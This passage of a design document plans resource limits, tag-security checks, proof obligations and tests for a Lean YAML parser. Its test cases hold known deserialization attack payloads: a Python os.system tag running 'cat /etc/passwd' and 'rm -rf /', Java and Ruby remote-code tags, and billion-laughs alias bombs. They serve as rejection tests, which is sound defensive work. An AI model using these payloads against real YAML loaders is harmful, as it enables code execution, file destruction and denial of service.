- Thread `AliasTracker` through the monadic context (currently shown as tuple returns)
- Use proper state monad or explicit state passing
- Handle the return types consistently with proper lifting between error types

### Backward Compatibility

To maintain backward compatibility with code expecting `Except String`, provide wrapper functions:

```lean
-- Compatibility layer: convert ParseError to String
def parseYamlString (input : String) (limits : ParserLimits := {})
    : Except String (Array YamlDocument) :=
  parseYaml input limits |>.mapError toString

def YamlDocument.composeString (doc : YamlDocument) (limits : ParserLimits := {})
    (docIndex : Nat := 0) : Except String YamlDocument :=
  doc.compose limits docIndex |>.mapError toString

-- Migration path: old function can delegate to new one
@[deprecated parseYaml "Use parseYaml and handle structured errors"]
def parseYamlOld (input : String) : Except String (Array YamlDocument) :=
  parseYamlString input ParserLimits.unlimited
```

**Migration guide** for existing code:

```lean
-- Before:
match parseYaml input with
| .ok docs => -- handle success
| .error msg => IO.eprintln msg

-- After (Option 1: Continue using strings):
match parseYamlString input with
| .ok docs => -- handle success
| .error msg => IO.eprintln msg

-- After (Option 2: Handle structured errors):
match parseYaml input with
| .ok docs => -- handle success
| .error (.syntaxError msg pos) => IO.eprintln s!"Syntax error: {msg}"
| .error (.limitViolation err) => IO.eprintln s!"Limit exceeded: {err}"
```

## Proof Burden

### Theorem Targets

Implementing limits changes the parser's **contract**:

**Before**: `parseYaml input = .ok docs → Grammar.ValidYaml input docs`

**After**: `parseYaml input limits = .ok docs → Grammar.ValidYaml input docs ∧ SatisfiesLimits docs limits`

New proof obligations:

#### 1. Soundness Preservation

```lean
theorem parseYaml_sound_with_limits :
  ∀ (input : String) (docs : Array YamlDocument) (limits : ParserLimits),
    parseYaml input limits = .ok docs →
    Grammar.ValidYaml input docs

-- Variant: syntax errors preserve invalidity
theorem parseYaml_syntax_error_sound :
  ∀ (input : String) (msg : String) (pos : YamlPos) (limits : ParserLimits),
    parseYaml input limits = .error (.syntaxError msg pos) →
    ¬Grammar.ValidYaml input _

-- Limits don't affect grammar validity
theorem limit_error_preserves_grammar :
  ∀ (input : String) (err : LimitError) (limits : ParserLimits),
    parseYaml input limits = .error (.limitViolation err) →
    (∃ docs limits', parseYaml input limits' = .ok docs ∧ Grammar.ValidYaml input docs)
```

**Proof strategy**:
- The existing soundness proof (`Proofs/Soundness.lean`) should carry through unchanged for the success case
- Limits only *reject* additional inputs without changing grammar rules for accepted inputs
- The `limit_error_preserves_grammar` theorem states that limit violations don't imply syntax errors: the same input could parse successfully with more permissive limits
- This separates resource constraints from grammatical correctness

#### 2. Limit Enforcement

```lean
-- Error type completeness: all limit violations produce appropriate errors
theorem limit_violation_produces_error :
  ∀ (input : String) (limits : ParserLimits) (docs : Array YamlDocument),
    parseYaml input limits = .ok docs →
    limits.enabled →
    satisfiesAllLimits docs limits

-- Alias expansion limits are respected or error is thrown
theorem compose_respects_alias_limits :
  ∀ (doc : YamlDocument) (limits : ParserLimits) (idx : Nat),
    limits.enabled →
    match doc.compose limits idx with
    | .ok doc' =>
        aliasExpansionCount doc.value doc.anchors ≤ limits.alias.maxAliasExpansions
        ∧ resolvedNodeCount doc' ≤ limits.alias.maxResolvedNodes
        ∧ aliasDepth doc.value doc.anchors ≤ limits.alias.maxAliasDepth
        ∧ ¬hasCycles doc.value doc.anchors
    | .error (.aliasLimit err) =>
        (∃ name path, err = .cyclicAlias name path ∧ hasCycles doc.value doc.anchors)
        ∨ (∃ d l n, err = .depthExceeded d l n ∧ d > l)
        ∨ (∃ c l, err = .expansionCountExceeded c l ∧ c > l)
        ∨ (∃ c l, err = .nodeCountExceeded c l ∧ c > l)
    | _ => False  -- No other error types from compose

-- Structural limits are enforced during parsing
theorem parse_respects_structural_limits :
  ∀ (input : String) (limits : ParserLimits),
    limits.enabled →
    match parseYaml input limits with
    | .ok docs =>
        (∀ doc ∈ docs, maxDepth doc.value ≤ limits.structural.maxDepth)
        ∧ (∀ doc ∈ docs, maxScalarSize doc.value ≤ limits.structural.maxScalarBytes)
        ∧ totalNodeCount docs ≤ limits.structural.maxTotalNodes
    | .error (.limitViolation (.structuralLimit err)) =>
        (∃ d l p, err = .depthExceeded d l p ∧ d > l)
        ∨ (∃ len l p, err = .sequenceTooLarge len l p ∧ len > l)
        ∨ (∃ sz l p, err = .mappingTooLarge sz l p ∧ sz > l)
        ∨ (∃ b l p, err = .scalarTooLarge b l p ∧ b > l)
        ∨ (∃ c l, err = .totalNodesExceeded c l ∧ c > l)
    | _ => True  -- Syntax errors or other limit errors

-- Document limits are enforced
theorem parse_respects_document_limits :
  ∀ (input : String) (limits : ParserLimits),
    limits.enabled →
    match parseYaml input limits with
    | .ok docs =>
        docs.size ≤ limits.document.maxDocuments
        ∧ input.utf8ByteSize ≤ limits.document.maxInputBytes
        ∧ (∀ idx, ∀ doc ∈ docs, doc.anchors.size ≤ limits.document.maxAnchors)
    | .error (.limitViolation (.documentLimit err)) =>
        (∃ c l, err = .tooManyDocuments c l ∧ c > l)
        ∨ (∃ c l idx, err = .tooManyAnchors c l idx ∧ c > l)
        ∨ (∃ b l, err = .inputTooLarge b l ∧ b > l)
    | _ => True  -- Syntax errors or other limit errors

-- Error context accuracy
theorem error_context_accurate :
  ∀ (input : String) (limits : ParserLimits) (err : LimitError),
    parseYaml input limits = .error (.limitViolation err) →
    match err with
    | .structuralLimit (.depthExceeded _ _ path) => validPath path
    | .structuralLimit (.sequenceTooLarge len _ path) =>
        validPath path ∧ (∃ seq, valueAtPath input path = some seq ∧ seq.length = len)
    | .documentLimit (.tooManyAnchors _ _ docIdx) => docIdx < documentCount input
    | _ => True
```

**Proof strategy**:
- Define auxiliary functions (`aliasExpansionCount`, `resolvedNodeCount`, `maxDepth`, `hasCycles`, etc.)
- Prove instrumentation is correct: counters accurately reflect actual values
- Prove error types match violations: e.g., `.cyclicAlias` iff actual cycle exists
- Prove context is accurate: paths/indices in errors correspond to actual document structure

#### 3. Completeness Preservation

```lean
-- No false negatives: valid YAML within limits is accepted
theorem parse_complete_within_limits :
  ∀ (input : String) (limits : ParserLimits),
    Grammar.ValidYaml input docs →
    SatisfiesLimits docs limits →
    limits.enabled →
    ∃ docs', parseYaml input limits = .ok docs' ∧ docs' ≈ docs

-- Corollary: if parsing fails with limit error, either invalid or exceeds limits
theorem parse_failure_dichotomy :
  ∀ (input : String) (limits : ParserLimits) (err : ParseError),
    parseYaml input limits = .error err →
    match err with
    | .syntaxError _ _ => ¬Grammar.ValidYaml input _
    | .limitViolation _ =>
        ∃ docs, Grammar.ValidYaml input docs ∧ ¬SatisfiesLimits docs limits

-- Error type determinism: same violation produces same error type
theorem error_type_deterministic :
  ∀ (input : String) (limits : ParserLimits) (err₁ err₂ : ParseError),
    parseYaml input limits = .error err₁ →
    parseYaml input limits = .error err₂ →
    err₁ = err₂

-- Specific error matching: can identify exact violation
theorem specific_error_correct :
  ∀ (input : String) (limits : ParserLimits) (name : String) (path : List String),
    parseYaml input limits = .error (.limitViolation (.cyclicAlias name path)) →
    ∃ docs, Grammar.ValidYaml input docs ∧ hasCyclicAlias docs name path
```

**Proof burden**: This is the **expensive** part. The current completeness proof (`Proofs/Completeness.lean`) uses `native_decide` for decidability. Adding limits means:

1. Prove **valid YAML within limits** is still accepted (no false negatives)
2. For each limit check, show it doesn't introduce spurious failures
3. Prove error types correctly classify violations (structural vs. syntax)
4. Handle stateful tracking in `resolveAliasesLimited` — tracker state must be sound
5. Prove error contexts (paths, indices) are accurate

**Estimated effort**:
- **Alias limits**: 2–3 weeks (cycle detection proof is non-trivial)
- **Structural limits**: 3–4 weeks (path tracking through recursive descent)
- **Document limits**: 1–2 weeks (simpler, just counter checks)
- **Error type soundness**: 2–3 weeks (prove error constructors match violations)

**Total**: 8–12 weeks of verification work.

#### 4. Termination

Adding counters and bounds helps prove termination:

```lean
-- Alias resolution terminates when limits are enforced
theorem resolveAliasesLimited_terminates :
  ∀ (v : YamlValue) (anchors : AnchorMap) (limits : AliasLimits),
    ∃ result, resolveAliasesLimited v anchors limits = result
```

**Proof strategy**: The expansion counter provides a decreasing metric. Each recursive call either makes progress (substituting an alias) or terminates (scalar, empty collection). The `maxAliasExpansions` bound guarantees finite recursion depth.

This may allow removing `partial` from `resolveAliases` in Types.lean:369, making it a total `def` provably terminating under limits.

### Incremental Proof Strategy

To minimize disruption:

1. **Phase 1**: Implement limits as runtime checks without proofs (guard tests only)
2. **Phase 2**: Prove soundness preservation (limits don't break existing grammar proofs)
3. **Phase 3**: Prove limit enforcement (instrumentation is correct)
4. **Phase 4**: Prove completeness preservation (no false negatives within limits)
5. **Phase 5**: Prove termination (enable total functions, remove `partial`)

**Recommendation**: Defer proof work until after core scanner/parser verification is complete (current focus). Add limits as **opt-in runtime protection** initially, with proofs as future work.

## Error Handling Patterns

### Pattern Matching on Errors

Users can pattern match on specific error types for precise error handling:

```lean
def parseWithHandling (input : String) : IO Unit := do
  match parseYaml input ParserLimits.strict with
  | .ok docs =>
    IO.println s!"Successfully parsed {docs.size} documents"

  | .error (.aliasLimit err) =>
    match err with
    | .cyclicAlias name path =>
      IO.eprintln s!"ERROR: Detected circular reference in alias '{name}'"
      IO.eprintln s!"  Resolution path: {" → ".intercalate path}"
    | .expansionCountExceeded count limit =>
      IO.eprintln s!"ERROR: Document too complex ({count} alias expansions > {limit})"
      IO.eprintln "  This may be a billion-laugh attack. Use ParserLimits.permissive for trusted input."
    | .depthExceeded depth limit _ =>
      IO.eprintln s!"ERROR: Alias nesting too deep ({depth} > {limit})"
    | .nodeCountExceeded count limit =>
      IO.eprintln s!"ERROR: Document too large ({count} nodes > {limit})"

  | .error (.structuralLimit err) =>
    match err with
    | .depthExceeded depth limit path =>
      IO.eprintln s!"ERROR: Nesting depth exceeded at {err.pathToString path}"
    | .sequenceTooLarge length limit path =>
      IO.eprintln s!"ERROR: Sequence has {length} items (max {limit})"
    | .scalarTooLarge bytes limit _ =>
      IO.eprintln s!"ERROR: Scalar is {bytes} bytes (max {limit})"
    | _ => IO.eprintln s!"ERROR: {err}"

  | .error (.documentLimit err) =>
    match err with
    | .inputTooLarge bytes limit =>
      IO.eprintln s!"ERROR: Input file is {bytes} bytes (max {limit})"
      IO.eprintln "  Use ParserLimits.permissive or stream parsing for large files."
    | .tooManyDocuments count limit =>
      IO.eprintln s!"ERROR: Stream contains {count} documents (max {limit})"
    | .tooManyAnchors count limit docIdx =>
      IO.eprintln s!"ERROR: Document {docIdx} has {count} anchors (max {limit})"

  | .error (.tagSecurity err) =>
    match err with
    | .dangerousLanguageTag tag language =>
      IO.eprintln s!"⚠️ SECURITY ALERT: Dangerous {language} tag detected: {tag}"
      IO.eprintln "  This tag may execute arbitrary code. Rejecting document."
      IO.eprintln "  If this is trusted input, use ParserLimits.unlimited (UNSAFE)."
      -- Log to security monitoring system
      logSecurityEvent s!"Blocked dangerous tag: {tag}"
    | .forbiddenTag tag reason =>
      IO.eprintln s!"⚠️ SECURITY: Tag '{tag}' is forbidden: {reason}"
      IO.eprintln "  Only Core Schema tags are allowed (!!str, !!int, !!float, !!bool, !!null)"
    | .nonCoreSchemaTag tag =>
      IO.eprintln s!"⚠️ SECURITY: Non-standard tag '{tag}' rejected"
      IO.eprintln "  Only YAML 1.2 Core Schema tags permitted in strict mode"
    | .customHandleRejected handle prefix =>
      IO.eprintln s!"⚠️ SECURITY: Custom tag handle '{handle}' → '{prefix}' rejected"
      IO.eprintln "  Custom tag handles disabled in strict mode"
    | .tagTooLong bytes limit _ =>
      IO.eprintln s!"⚠️ SECURITY: Tag length {bytes} exceeds limit {limit}"
      IO.eprintln "  Possible tag bomb attack"
    | .tooManyUniqueTags count limit =>
      IO.eprintln s!"⚠️ SECURITY: Too many unique tags: {count} > {limit}"
      IO.eprintln "  Possible tag table bloat attack"
    | .handlePrefixTooLong bytes limit _ =>
      IO.eprintln s!"⚠️ SECURITY: Tag handle prefix length {bytes} exceeds limit {limit}"
```

### Converting to Strings

For simple error display, use the `ToString` instances:

```lean
def parseSimple (input : String) : IO Unit := do
  match parseYaml input with
  | .ok docs => IO.println s!"Parsed {docs.size} documents"
  | .error err => IO.eprintln s!"Parse failed: {err}"
```

### Retrying with Relaxed Limits

```lean
def parseWithFallback (input : String) : IO (Array YamlDocument) := do
  -- Try strict limits first (for untrusted input)
  match parseYaml input ParserLimits.strict with
  | .ok docs => return docs
  | .error limitErr =>
    IO.eprintln s!"Strict parsing failed: {limitErr}"
    IO.eprintln "Retrying with permissive limits..."

    -- Retry with permissive limits if strict fails
    match parseYaml input ParserLimits.permissive with
    | .ok docs =>
      IO.println "⚠ Warning: Document exceeds strict limits but parsed successfully"
      return docs
    | .error err =>
      throw <| IO.userError s!"Parse failed even with permissive limits: {err}"
```

### Tag Security in Practice

**Example 1: Detecting attacks in untrusted input**

```lean
def parseUntrustedUserInput (yaml : String) : IO (Option (Array YamlDocument)) := do
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    -- Success: document uses only safe Core Schema tags
    return some docs

  | .error (.limitViolation (.tagSecurity (.dangerousLanguageTag tag language))) =>
    -- CRITICAL: Potential code execution attack detected
    logSecurityEvent {
      severity := .critical
      category := "code_execution_attempt"
      message := s!"Blocked {language} tag: {tag}"
      sourceIP := getUserIP ()
      timestamp := getCurrentTime ()
    }
    IO.eprintln "⚠️ SECURITY INCIDENT: Malicious YAML tag detected and blocked"
    return none

  | .error (.limitViolation (.tagSecurity err)) =>
    -- Other tag security violations (still concerning)
    logSecurityEvent {
      severity := .high
      category := "tag_violation"
      message := err.toString
    }
    IO.eprintln s!"Tag security violation: {err}"
    return none

  | .error (.limitViolation (.aliasLimit (.expansionCountExceeded _ _))) =>
    -- Possible billion-laugh attack
    logSecurityEvent {
      severity := .high
      category := "dos_attempt"
      message := "Billion laugh attack detected"
    }
    IO.eprintln "⚠️ SECURITY: Possible DoS attack (billion laughs)"
    return none

  | .error err =>
    -- Other errors (syntax errors, other limit violations)
    IO.eprintln s!"Parse error: {err}"
    return none
```

**Example 2: Application-specific tag whitelist**

```lean
def parseAppConfig (yaml : String) : IO AppConfig := do
  -- Define application-specific allowed tags
  let appLimits : ParserLimits := {
    enabled := true
    tag := {
      policy := .whitelist [
        "tag:yaml.org,2002:str",
        "tag:yaml.org,2002:int",
        "tag:yaml.org,2002:bool",
        "tag:yaml.org,2002:null",
        "tag:yaml.org,2002:seq",
        "tag:yaml.org,2002:map",
        "!myapp/database",     -- Custom database config tag
        "!myapp/server",       -- Custom server config tag
        "!myapp/feature-flag"  -- Custom feature flag tag
      ]
      rejectLanguageTags := true  -- Always reject !!python/*, !!java/*, etc.
      maxUniqueTags := 20
      rejectCustomHandles := false  -- Allow %TAG for !myapp/* tags
    }
    -- Resource limits remain permissive for config files
    alias := { maxAliasExpansions := 10_000, ... }
    structural := { maxDepth := 100, ... }
  }

  match parseYaml yaml appLimits with
  | .ok docs =>
    -- Safe to deserialize: only known tags present
    deserializeAppConfig docs
  | .error (.limitViolation (.tagSecurity (.forbiddenTag tag reason))) =>
    throw <| IO.userError s!"Invalid config tag '{tag}': {reason}"
  | .error err =>
    throw <| IO.userError s!"Config parse error: {err}"
```

**Example 3: Conditional tag strictness based on source**

```lean
def parseYamlFromSource (yaml : String) (source : Source) : IO (Array YamlDocument) := do
  let limits := match source with
  | .userUpload =>
    -- Strictest: untrusted public input
    ParserLimits.strict
  | .apiRequest =>
    -- Strict tags, moderate resource limits
    ParserLimits.strict
  | .configFile =>
    -- Allow app-specific tags, permissive resource limits
    { ParserLimits.permissive with
      tag := { policy := .whitelist [/* app tags */], rejectLanguageTags := true } }
  | .internalTrusted =>
    -- Relaxed limits but still reject dangerous language tags
    { ParserLimits.permissive with
      tag := { policy := .coreSchemaOnly, rejectLanguageTags := true } }
  | .testSuite =>
    -- Only for testing, never production
    ParserLimits.unlimited

  match parseYaml yaml limits with
  | .ok docs => return docs
  | .error err => throw <| IO.userError s!"Parse failed: {err}"
```

**Example 4: Progressive validation with detailed reporting**

```lean
structure ValidationReport where
  passed : Bool
  securityIssues : Array String
  resourceIssues : Array String
  recommendations : Array String

def validateYamlSecurity (yaml : String) : IO ValidationReport := do
  let mut report := {
    passed := true,
    securityIssues := #[],
    resourceIssues := #[],
    recommendations := #[]
  }

  -- Try parsing with strict limits
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    return report  -- All good!

  | .error (.limitViolation (.tagSecurity (.dangerousLanguageTag tag lang))) =>
    report := { report with
      passed := false
      securityIssues := report.securityIssues.push
        s!"CRITICAL: Dangerous {lang} tag detected: {tag}"
      recommendations := report.recommendations.push
        "Remove language-specific tags. Use only YAML Core Schema types."
    }

  | .error (.limitViolation (.aliasLimit (.expansionCountExceeded count limit))) =>
    report := { report with
      passed := false
      resourceIssues := report.resourceIssues.push
        s!"Alias expansion count ({count}) exceeds limit ({limit})"
      recommendations := report.recommendations.push
        "Reduce alias complexity or use explicit values instead of aliases."
    }

  | .error (.limitViolation (.structuralLimit err)) =>
    report := { report with
      passed := false
      resourceIssues := report.resourceIssues.push err.toString
    }

  | _ => report := { report with passed := false }

  return report
```

## Testing Strategy

### Guard Tests

Add compile-time `#guard` tests for limit enforcement:

```lean
-- Test alias expansion limit
#guard
  let billionLaugh := "a: &a [1,2]\nb: &b [*a,*a]\nc: [*b,*b,*b,*b,*b,...]"
  match parseYaml billionLaugh { alias.maxAliasExpansions := 10 } with
  | .error (.aliasLimit (.expansionCountExceeded _ _)) => true
  | _ => false

-- Test depth limit
#guard
  let deepNesting := "- - - - - - - - ... (100 levels)"
  match parseYaml deepNesting { structural.maxDepth := 50 } with
  | .error (.structuralLimit (.depthExceeded _ _ _)) => true
  | _ => false

-- Test scalar size limit
#guard
  let hugeScalar := "value: " ++ String.replicate 100_000 "x"
  match parseYaml hugeScalar { structural.maxScalarBytes := 10_000 } with
  | .error (.structuralLimit (.scalarTooLarge _ _ _)) => true
  | _ => false

-- Test cycle detection
#guard
  let cyclicYaml := "a: &a [*a]"
  match parseYaml cyclicYaml with
  | .error (.aliasLimit (.cyclicAlias "a" _)) => true
  | _ => false

-- Test Python tag rejection
#guard
  let pythonExecTag := "!!python/object/apply:os.system\nargs: ['cat /etc/passwd']"
  match parseYaml pythonExecTag ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Python")) => tag.startsWith "!!python/"
  | _ => false

-- Test Java tag rejection
#guard
  let javaTag := "!!java.net.URLClassLoader\nargs: [...]"
  match parseYaml javaTag ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Java")) => tag.startsWith "!!java"
  | _ => false

-- Test non-Core-Schema tag rejection
#guard
  let customTag := "!!myapp/config\nkey: value"
  match parseYaml customTag ParserLimits.strict with
  | .error (.tagSecurity (.nonCoreSchemaTag tag)) => tag.startsWith "!!myapp/"
  | _ => false

-- Test Core Schema tags accepted
#guard
  let coreSchemaYaml := "str: !!str hello\nint: !!int 42\nbool: !!bool true"
  match parseYaml coreSchemaYaml ParserLimits.strict with
  | .ok _ => true
  | _ => false

-- Test tag length limit
#guard
  let longTag := "!!" ++ String.replicate 2000 "x"  ++ "\nvalue: test"
  match parseYaml longTag ParserLimits.strict with
  | .error (.tagSecurity (.tagTooLong bytes limit _)) => bytes > limit
  | _ => false
```

Add to `Tests/ValidationTests.lean` as a new test category.

### Runtime Tests

Add to `Tests/Main.lean`:

```lean
setCategory "Limits"

check "billion laugh attack blocked" do
  let yaml := constructBillionLaughPayload 9  -- 8^9 expansions
  match parseYaml yaml ParserLimits.strict with
  | .error (.aliasLimit (.expansionCountExceeded count limit)) =>
    if count ≤ limit then
      throw s!"expansion count {count} should exceed limit {limit}"
  | .ok _ => throw "expected limit error, got success"
  | .error other => throw s!"wrong error type: {other}"

check "cyclic alias detected" do
  let yaml := "a: &a [*a]"
  match parseYaml yaml with
  | .error (.aliasLimit (.cyclicAlias name path)) =>
    if name != "a" then throw s!"wrong alias name: {name}"
    if path.isEmpty then throw "expected non-empty resolution path"
  | .ok _ => throw "expected cycle detection error"
  | .error other => throw s!"wrong error type: {other}"

check "valid YAML within limits accepted" do
  let yaml := "a: &a [1,2,3]\nb: [*a, *a]"  -- 2 expansions, well below limit
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    if docs.size != 1 then throw s!"expected 1 document, got {docs.size}"
  | .error err => throw s!"false negative: {err}"

check "unlimited mode bypasses all checks" do
  let yaml := constructBillionLaughPayload 6  -- Smaller to avoid OOM in tests
  match parseYaml yaml ParserLimits.unlimited with
  | .ok _ => pure ()
  | .error err => throw s!"unlimited mode rejected input: {err}"

check "error contains useful context" do
  let yaml := "items:\n  - - - - - - (100 levels)"
  match parseYaml yaml { structural.maxDepth := 10 } with
  | .error (.structuralLimit (.depthExceeded depth limit path)) =>
    if depth ≤ limit then throw "depth should exceed limit"
    if path.isEmpty then throw "path should not be empty"
  | _ => throw "expected depth exceeded error"

setCategory "Tag Security"

check "Python code execution tag blocked" do
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['rm -rf /']"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Python")) =>
    if !tag.containsSubstr "python" then
      throw s!"expected python tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Python tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Java RCE tag blocked" do
  let yaml := "!!javax.script.ScriptEngineManager [...]\n"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Java")) =>
    if !tag.containsSubstr "java" then
      throw s!"expected java tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Java tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Ruby deserialization tag blocked" do
  let yaml := "--- !ruby/object:Gem::Installer\n  i: x"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.dangerousLanguageTag tag "Ruby")) =>
    if !tag.containsSubstr "ruby" then
      throw s!"expected ruby tag, got: {tag}"
  | .ok _ => throw "CRITICAL: Dangerous Ruby tag was not blocked!"
  | .error other => throw s!"wrong error type: {other}"

check "Core Schema tags accepted" do
  let yaml := "str: !!str hello\nint: !!int 42\nfloat: !!float 3.14\nbool: !!bool true\nnull: !!null\nseq: !!seq [1,2,3]\nmap: !!map {a: 1}"
  match parseYaml yaml ParserLimits.strict with
  | .ok docs =>
    if docs.size != 1 then throw s!"expected 1 document, got {docs.size}"
  | .error err => throw s!"Core Schema tags should be accepted: {err}"

check "non-Core-Schema custom tag rejected in strict mode" do
  let yaml := "config: !!myapp/config\n  key: value"
  match parseYaml yaml ParserLimits.strict with
  | .error (.tagSecurity (.nonCoreSchemaTag tag)) =>
    if !tag.containsSubstr "myapp" then
      throw s!"wrong tag in error: {tag}"
  | .ok _ => throw "custom tag should be rejected in strict mode"
  | .error other => throw s!"wrong error type: {other}"

check "custom tag accepted in whitelist" do
  let limits := { ParserLimits.strict with
    tag := { policy := .whitelist [
      "tag:yaml.org,2002:str", "tag:yaml.org,2002:int",
      "!!myapp/config"
    ], rejectLanguageTags := true }
  }
  let yaml := "config: !!myapp/config\n  key: value"
  match parseYaml yaml limits with
  | .ok _ => pure ()
  | .error err => throw s!"whitelisted tag should be accepted: {err}"

check "dangerous tag rejected even in whitelist if rejectLanguageTags=true" do
  let limits := { ParserLimits.strict with
    tag := { policy := .whitelist ["!!python/object/apply:os.system"],
             rejectLanguageTags := true }
  }
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['ls']"
  match parseYaml yaml limits with
  | .error (.tagSecurity (.dangerousLanguageTag _ "Python")) => pure ()
  | .ok _ => throw "rejectLanguageTags should override whitelist"
  | .error other => throw s!"wrong error type: {other}"

check "tag length limit enforced" do
  let longTag := "!!" ++ String.replicate 5000 "x" ++ "\nvalue: test"
  match parseYaml longTag ParserLimits.strict with
  | .error (.tagSecurity (.tagTooLong bytes limit _)) =>
    if bytes ≤ limit then throw s!"tag length {bytes} should exceed limit {limit}"
  | .ok _ => throw "tag length limit should be enforced"
  | .error other => throw s!"wrong error type: {other}"

check "unlimited mode accepts all tags (UNSAFE)" do
  let yaml := "exploit: !!python/object/apply:os.system\n  args: ['echo unsafe']"
  match parseYaml yaml ParserLimits.unlimited with
  | .ok _ => pure ()  -- Unlimited mode bypasses all checks
  | .error err => throw s!"unlimited mode should accept all tags: {err}"
```

### yaml-test-suite Regression

Ensure no false negatives: all 406 yaml-test-suite tests passing with `ParserLimits.permissive` should still pass.

Run: `lake exe suite-runner --limits=permissive` (requires adding `--limits` CLI flag).

## Implementation Checklist

### Phase 1: Error Types (Day 1)
- [ ] Define error type hierarchy in Types.lean:
  - [ ] `AliasLimitError` inductive with 4 variants
  - [ ] `StructuralLimitError` inductive with 5 variants
  - [ ] `DocumentLimitError` inductive with 3 variants
  - [ ] `TagSecurityError` inductive with 7 variants
  - [ ] `LimitError` composite type wrapping all four
  - [ ] `ParseError` distinguishing syntax vs. limit/security errors
- [ ] Add `toString` implementations for all error types
- [ ] Add convenience constructors in `LimitError` namespace
- [ ] Add `extractLanguage` helper for tag error reporting

### Phase 2: Limit Configuration (Day 1-2)
- [ ] Define `ParserLimits` structure in Types.lean
- [ ] Define nested limit structures (`AliasLimits`, `StructuralLimits`, `DocumentLimits`, `TagLimits`)
- [ ] Define `TagPolicy` inductive (allowAll | rejectAll | whitelist | blacklist | coreSchemaOnly)
- [ ] Define Core Schema whitelist constant
- [ ] Define dangerous tag prefixes blacklist constant
- [ ] Add predefined configurations (`.strict`, `.permissive`, `.unlimited`, `.safeTagsOnly`)
- [ ] Add `Repr`, `BEq`, `Inhabited` instances

### Phase 3: Core Implementation (Day 2-4)
- [ ] **Resource limits**:
  - [ ] Implement `YamlValue.resolveAliasesLimited` with `AliasTracker`
  - [ ] Implement `resolveAliasesLimitedLifted` wrapper returning `LimitError`
  - [ ] Update `YamlDocument.compose` signature to accept limits and return `Except LimitError`
  - [ ] Add depth tracking to TokenParser state
  - [ ] Add collection size checks in sequence/mapping parsers
  - [ ] Add scalar size checks in block scalar / flow scalar parsers
  - [ ] Add total node counter to parser state
- [ ] **Tag security**:
  - [ ] Implement tag validation function: `validateTag : String → TagLimits → Except TagSecurityError Unit`
  - [ ] Add tag validation checks during scalar/sequence/mapping parsing
  - [ ] Implement tag length checks when parsing tags
  - [ ] Track unique tags per document in parser state
  - [ ] Implement `%TAG` directive validation (handle prefix length checks)
  - [ ] Add dangerous language tag pattern matching
  - [ ] Implement Core Schema whitelist checking
  - [ ] Implement custom whitelist/blacklist checking
- [ ] Update `parseYamlRaw` to return `Except ParseError` and track all limits
- [ ] Update `parseYaml` to return `Except ParseError` and compose with limits

### Phase 4: Backward Compatibility (Day 3)
- [ ] Add `parseYamlString` compatibility wrapper
- [ ] Add `composeString` compatibility wrapper
- [ ] Add `@[deprecated]` attributes to old functions
- [ ] Update all internal call sites to use new error types

### Phase 5: Testing (Day 5-7)
- [ ] Add guard tests in `Tests/ValidationTests.lean`:
  - [ ] Alias expansion limit tests
  - [ ] Depth limit tests
  - [ ] Scalar size limit tests
  - [ ] Cycle detection tests
  - [ ] **Tag security tests**:
    - [ ] Python tag rejection
    - [ ] Java tag rejection
    - [ ] Ruby/PHP/Perl tag rejection
    - [ ] Core Schema tag acceptance
    - [ ] Non-Core-Schema tag rejection
    - [ ] Tag length limit
    - [ ] Custom handle rejection
- [ ] Add runtime tests in `Tests/Main.lean`:
  - [ ] Billion laugh attack detection
  - [ ] Cyclic alias detection
  - [ ] Valid YAML acceptance within limits
  - [ ] Error context validation
  - [ ] Unlimited mode bypass
  - [ ] **Tag security runtime tests**:
    - [ ] Python code execution tag blocked (!!python/object/apply:os.system)
    - [ ] Java RCE tag blocked (!!javax.script.ScriptEngineManager)
    - [ ] Ruby deserialization tag blocked (!ruby/object:Gem::Installer)
    - [ ] Core Schema tags accepted
    - [ ] Custom tags with whitelist policy
    - [ ] Dangerous tags rejected even in whitelist if rejectLanguageTags=true
    - [ ] Tag length enforcement
    - [ ] Unlimited mode accepts all tags
- [ ] Add attack payload generators in `Tests/Utils.lean`:
  - [ ] Billion laugh payload generator
  - [ ] Dangerous tag payload generator (Python, Java, Ruby variants)
- [ ] Add error handling pattern tests
- [ ] Run yaml-test-suite regression with `--limits=permissive`
- [ ] Add security test suite for common attack patterns

### Phase 6: Documentation & Polish (Day 7-8)
- [ ] Document limits in README.md
- [ ] Add SECURITY.md documenting tag security features
- [ ] Update API documentation with error type examples
- [ ] Add `--limits` CLI flag to `suite-runner` binary
- [ ] Add `--tag-policy` CLI flag for tag validation mode
- [ ] Update `Demo.lean` examples to show:
  - [ ] Basic limit configuration
  - [ ] Error pattern matching
  - [ ] Fallback with relaxed limits
  - [ ] **Tag security examples**:
    - [ ] Parsing untrusted user input with strict tag validation
    - [ ] Application-specific tag whitelists
    - [ ] Conditional tag strictness based on source
    - [ ] Security event logging for dangerous tags
- [ ] Add migration guide for existing code
- [ ] Document common attack patterns and mitigations

### Phase 7: Verification (Deferred)
- [ ] **Defer**: Prove soundness preservation with new error types
- [ ] **Defer**: Prove limit enforcement correctness
- [ ] **Defer**: Prove completeness preservation (no false negatives)
- [ ] **Defer**: Prove termination under limits
- [ ] **Defer**: Prove error type exhaustiveness (all limit violations caught)
- [ ] **Defer**: Prove tag validation correctness:
  - [ ] Core Schema whitelist is complete
  - [ ] Dangerous tag blacklist matches known attack patterns
  - [ ] Tag policy enforcement is sound (no bypasses)

**Estimated implementation time** (runtime only, no proofs): 7-8 days
- Days 1-2: Error types and configuration (includes tag security types)
- Days 2-4: Core limit tracking + tag validation implementation
- Day 4: Backward compatibility layer
- Days 5-7: Comprehensive testing (resource + security)
- Days 7-8: Documentation and examples

**Estimated proof time**: 8–14 weeks (see Proof Burden below)
- Tag security verification adds 2-3 weeks to proof burden

